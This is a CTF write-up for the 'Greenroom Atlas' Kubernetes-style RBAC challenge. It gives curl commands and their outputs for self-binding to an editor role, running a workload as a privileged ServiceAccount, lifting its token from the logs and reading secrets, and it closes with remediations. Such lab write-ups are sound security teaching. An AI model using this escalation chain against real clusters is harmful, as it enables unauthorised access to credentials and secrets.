+++
date = '2026-10-07T15:23:00+03:00'
draft = false
title = 'Greenroom Atlas — PwnZone CTF 2026'
tags = ["PwnZone CTF 2026", "Cloud", "Cloud Security", "CTF Writeup", "Kubernetes", "RBAC", "Privilege Escalation", "Service Account"]
feature = 'feature.png'
showTableOfContents = true
+++

## Overview

Greenroom Atlas was a Kubernetes-style RBAC challenge at `http://54.72.82.22:8410`. I started as `tour-bot` with a seemingly weak `patch:rolebindings` grant, bound myself to the `editor` role to gain workload creation rights, then created a workload running under the `archive-agent` ServiceAccount with token auto-mounting enabled. The workload's logs leaked the mounted ServiceAccount token, which carried `get:secrets` — enough to retrieve the flag.

## Reconnaissance

I fetched the landing page and pulled the cluster manifest.

```
curl -s http://54.72.82.22:8410/
curl -s http://54.72.82.22:8410/downloads/cluster.json
```

- Materials: `/downloads/cluster.json`
- API: `POST /api/login`, `PATCH /api/bindings` (accepts `roleRef`), `POST /api/workloads` (accepts `serviceAccountName` and `automountServiceAccountToken`), `GET /api/workloads/NAME/logs`, `GET /api/secrets` — all requiring `Authorization: Bearer TOKEN`

```
{
  "namespace": "backstage",
  "bindings": {
    "tour-bot": [
      "get:workloads",
      "patch:rolebindings"
    ]
  },
  "roles": {
    "editor": [
      "create:workloads",
      "get:workloads/logs"
    ]
  },
  "serviceAccounts": {
    "default": [
      "read:public"
    ],
    "archive-agent": [
      "get:secrets"
    ]
  }
}
```

The path to the flag was visible in the manifest: `archive-agent` can `get:secrets`, and my only useful primitive was `patch:rolebindings`.

I authenticated as `tour-bot`.

```
curl -s -X POST http://54.72.82.22:8410/api/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"tour-bot"}'
```

```
{"namespace":"backstage","token":"tour-bot"}
```

I probed what my initial grants actually allowed.

```
curl -s -H 'Authorization: Bearer tour-bot' http://54.72.82.22:8410/api/workloads -w "\n[%{http_code}]\n"
curl -s -H 'Authorization: Bearer tour-bot' http://54.72.82.22:8410/api/bindings -w "\n[%{http_code}]\n"
curl -s -H 'Authorization: Bearer tour-bot' http://54.72.82.22:8410/api/secrets -w "\n[%{http_code}]\n"
```

`/api/workloads` and `/api/bindings` returned 404 (no read access), `/api/secrets` returned 403. The actionable primitive was `patch:rolebindings`.

## Privilege Escalation

I bound `tour-bot` to the `editor` role.

```
curl -s -X PATCH http://54.72.82.22:8410/api/bindings \
  -H 'Authorization: Bearer tour-bot' -H 'Content-Type: application/json' \
  -d '{"roleRef":"editor"}'
```

```
{"updated":true}
```

Only `editor` was accepted — `archive-agent`, `admin`, and `cluster-admin` were all rejected with 403. But `editor` was enough: I now had `create:workloads` and `get:workloads/logs`.

## Credential Theft

I created workloads under different ServiceAccounts with token auto-mounting enabled.

```
curl -s -X POST http://54.72.82.22:8410/api/workloads \
  -H 'Authorization: Bearer tour-bot' -H 'Content-Type: application/json' \
  -d '{"spec":{"serviceAccountName":"default","automountServiceAccountToken":true}}'
```
```
{"name":"dd13b4a12a203ac5"}
```

```
curl -s -X POST http://54.72.82.22:8410/api/workloads \
  -H 'Authorization: Bearer tour-bot' -H 'Content-Type: application/json' \
  -d '{"spec":{"serviceAccountName":"archive-agent","automountServiceAccountToken":true}}'
```
```
{"name":"5d4ab0cab8e47065"}
```

I also created a minimal workload with no ServiceAccount specified as a control.

```
curl -s -X POST http://54.72.82.22:8410/api/workloads \
  -H 'Authorization: Bearer tour-bot' -H 'Content-Type: application/json' \
  -d '{}'
```
```
{"name":"4cc24beeafb1b831"}
```

I pulled the logs for each workload.

```
curl -s -H 'Authorization: Bearer tour-bot' \
  http://54.72.82.22:8410/api/workloads/dd13b4a12a203ac5/logs
```
```
{"lines":["Ready."]}
```

```
curl -s -H 'Authorization: Bearer tour-bot' \
  http://54.72.82.22:8410/api/workloads/5d4ab0cab8e47065/logs
```
```
{"token":"archive-agent"}
```

```
curl -s -H 'Authorization: Bearer tour-bot' \
  http://54.72.82.22:8410/api/workloads/4cc24beeafb1b831/logs
```
```
{"lines":["Ready."]}
```

Only the workload running under `archive-agent` leaked a token.

## Secret Access

I used the stolen ServiceAccount token to read the secrets.

```
curl -s -H 'Authorization: Bearer archive-agent' \
  http://54.72.82.22:8410/api/secrets
```

```
{"message":"safctf{6035ffad158ce604cb84927b77926d47}","ok":true}
```

## Vulnerability Analysis

- **Unrestricted rolebinding writes:** `patch:rolebindings` allowed self-binding to `editor` with no `escalate`/`bind` restrictions.
- **Arbitrary ServiceAccount assignment:** `create:workloads` accepted any `serviceAccountName`, letting me run workloads as the more privileged `archive-agent`.
- **Credential leakage:** `automountServiceAccountToken: true` injected the SA token into the workload, and exposing it through logs disclosed the credential.
- **No admission control:** Nothing prevented untrusted principals from creating workloads under sensitive ServiceAccounts or auto-mounting their tokens.

## Conclusion

Attack chain:

1. Cluster manifest exposed `patch:rolebindings` and an `archive-agent` SA with `get:secrets`
2. Self-bound `tour-bot` to the `editor` role
3. Created a workload under `archive-agent` with token auto-mounting
4. Workload logs leaked the SA token
5. Stolen token retrieved the flag from `/api/secrets`

Remediations:

- Deny self-rolebinding — require the `bind`/`escalate` verbs for privilege-granting operations
- Restrict which ServiceAccounts workloads may use via admission control, and disable token auto-mounting by default
- Never expose mounted credentials in logs; treat SA tokens as high-value secrets
- Use short-lived, verifiable workload identity instead of long-lived mounted tokens
